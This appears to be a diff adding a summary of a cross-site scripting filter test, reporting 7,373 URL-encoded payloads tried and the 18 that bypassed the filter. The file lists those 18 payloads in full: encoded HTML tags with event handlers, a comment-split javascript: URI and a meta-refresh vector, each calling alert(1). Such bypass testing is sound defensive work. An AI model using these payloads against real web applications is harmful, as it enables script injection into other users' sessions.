@@ -1,0 +1,30 @@
+================================================================================
+File: url_encode.txt - Summary
+================================================================================
+Total Tested: 7373
+Bypassed: 18
+Blocked: 7355
+Bypass Rate: 0.24%
+================================================================================
+
+BYPASSED PAYLOADS:
+--------------------------------------------------------------------------------
+
+%3Ctable%20onpointerover%3Dalert%281%29%3EXSS%3C%2Ftable%3E
+%22%3Caudio%20autoplay%20onplaying%3Dalert%281%29%3E%3Csource%20src%3D%22%22validaudio.wav%22%22%20type%3D%22%22audio%2Fwav%22%22%3E%3C%2Faudio%3E%22
+%26%23x00003C
+%22%3Caudio%20autoplay%20onplaying%3Dalert%281%29%3E%3Csource%20src%3D%22%22validaudio.wav%22%22%20type%3D%22%22audio%2Fwav%22%22%3E%3C%2Faudio%3E%22
+%3Cobject%20id%3Dx%20tabindex%3D1%20ondeactivate%3Dalert%281%29%3E%3C%2Fobject%3E%3Cinput%20id%3Dy%20autofocus%3E
+%22%3Crt%20onpaste%3D%22%22alert%281%29%22%22%20contenteditable%3Etest%3C%2Frt%3E%22
+%22%3Cvar%20draggable%3D%22%22true%22%22%20ondragleave%3D%22%22alert%281%29%22%22%3Etest%3C%2Fvar%3E%22
+%22%3Celement%20onbeforecut%3D%22%22alert%281%29%22%22%20contenteditable%3Etest%3C%2Felement%3E%22
+javas%3C%21--%20--%3Ecript%3Aalert%28%27%27%29
+%3Cruby%20id%3Dx%20tabindex%3D1%20onactivate%3Dalert%281%29%3E%3C%2Fruby%3E
+%3Ccol%20id%3Dx%20tabindex%3D1%20onbeforedeactivate%3Dalert%281%29%3E%3C%2Fcol%3E%3Cinput%20autofocus%3E
+%3Caudio%20onpointerout%3Dalert%281%29%3EXSS%3C%2Faudio%3E
+%22%3Crt%20oncut%3D%22%22alert%281%29%22%22%20contenteditable%3Etest%3C%2Frt%3E%22
+%3Ctbody%20onpointerout%3Dalert%281%29%3EXSS%3C%2Ftbody%3E
+%3Cbody%20onpopstate%3Dalert%281%29%3E
+%3Clink%20id%3Dx%20tabindex%3D1%20ondeactivate%3Dalert%281%29%3E%3C%2Flink%3E%3Cinput%20id%3Dy%20autofocus%3E
+%22%3Cmeta%20content%3D%22%22%26NewLine%3B%201%20%26NewLine%3B%3B%20JAVASCRIPT%26colon%3B%20alert%281%29%22%22%20http-equiv%3D%22%22refresh%22%22%2F%3E%22
+%22%3Cplaintext%20draggable%3D%22%22true%22%22%20ondragleave%3D%22%22alert%281%29%22%22%3Etest%3C%2Fplaintext%3E%22
